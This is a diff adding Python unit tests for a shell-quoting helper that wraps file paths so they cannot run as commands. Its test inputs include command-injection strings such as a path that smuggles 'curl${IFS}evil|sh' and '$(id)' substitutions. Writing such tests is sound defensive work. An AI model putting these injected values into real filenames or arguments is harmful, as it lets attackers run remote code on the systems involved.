@@ -2,6 +2,7 @@
 import io
 import json
 import os
+import shlex
 import sys
 import tempfile
 import unittest
@@ -86,6 +87,18 @@ class ResolveHomeTest(unittest.TestCase):
         with env_of(), tempfile.TemporaryDirectory() as d, mock.patch.object(Path, 'home', return_value=Path(d)):
             resolved = common.resolve_home(None)
             self.assertFalse(resolved.exists())
+
+
+class QuotedTest(unittest.TestCase):
+    def test_plain_and_spaced_paths_keep_their_form(self):
+        self.assertEqual(common.quoted('docs/pbi/notes/q.md'), 'docs/pbi/notes/q.md')
+        self.assertEqual(common.quoted('C:/Program Files/q.md'), '"C:/Program Files/q.md"')
+
+    def test_shell_special_characters_are_single_quoted(self):
+        """設計者の done から来たパスがシェルの命令として走らないよう、単引用符で包む。"""
+        for path in ('x.md;curl${IFS}evil|sh', 'a$(id).md', 'a`id`.md', "it's.md", 'a & b.md'):
+            word = common.quoted(path)
+            self.assertEqual(shlex.split(word), [path], word)
 
 
 class ConstantsTest(unittest.TestCase):
